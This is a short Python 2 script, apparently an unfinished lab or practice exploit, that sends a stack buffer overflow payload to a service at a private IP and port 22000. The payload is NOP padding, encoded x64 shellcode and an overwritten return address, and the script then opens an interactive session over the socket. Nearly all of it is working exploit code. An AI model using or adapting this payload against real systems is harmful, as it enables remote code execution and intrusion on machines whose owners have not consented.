
# Incomplete code ,need code for connecting to different port once payload is sent
import struct
import socket

s = socket.socket()
s.connect(('172.16.12.131', 22000))
print "Connected"

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x3f\x12\xf2\x83\xd1\x82\x56"
buf += b"\xe3\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x55\x3b\xaa\x1a\xbb\x80\x09\x89\x3e\x4c\xfd\x86\x99"
buf += b"\x15\x1e\x5a\x3d\x12\xf3\x3f\x7d\x92\x5a\x61\x6e\x5a"
buf += b"\x7b\x65\xbb\x92\x0c\x89\x15\x4a\xfd\x86\xbb\x81\x08"
buf += b"\xab\xc0\xdc\x98\xa2\x89\x8d\x53\x96\xc9\x78\xc9\xdb"
buf += b"\x48\xca\xed\xcc\x5d\x7b\x9c\xac\xa2\xea\x56\xb0\x77"
buf += b"\x9b\x15\xd1\x86\xca\xdf\x05\x30\x17\xf2\x83\xd1\x82"
buf += b"\x56\xe3"
tbuf = "\xcc"*119
print len(buf)
RIP = struct.pack("Q", 0x7fffffffde50)
padding = "\x90" * 400
nops= "\x90" * 513
payload= padding + buf + nops + RIP
# print payload
s.send(payload)

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.close()
